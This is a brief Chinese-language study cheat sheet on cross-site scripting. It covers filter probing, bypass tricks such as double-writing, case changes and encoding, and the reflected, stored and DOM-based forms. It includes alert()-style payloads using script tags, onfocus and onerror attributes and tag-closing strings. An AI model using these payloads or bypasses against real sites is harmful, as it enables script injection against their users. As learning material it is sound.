# 测试过滤词



```
"<>'on/`() script img href src java
```

等等...

# 绕过技巧

```
双写
大小写
编码方式
看view：source   ，闭合标签
```

# 反射型xss

```
<script>alert(1)</script>
```



```
input等标签
onfocus=javascript:alert(1)' 
```



# 存储型xss

存储在文件里，其他用户访问该界面，会执行特定js代码



# DOM型xss

需要技巧来闭合标签 

```
"> <a href=javascript:alert()> "<
```

```
当src错误时，就会报错
<img src=111 onerror=alert('xss')>
```



# htmlspecialchars

```
绕过尝试单双引号都试试
如尖括号被过滤 考虑标签内属性onfocus等
```

#  
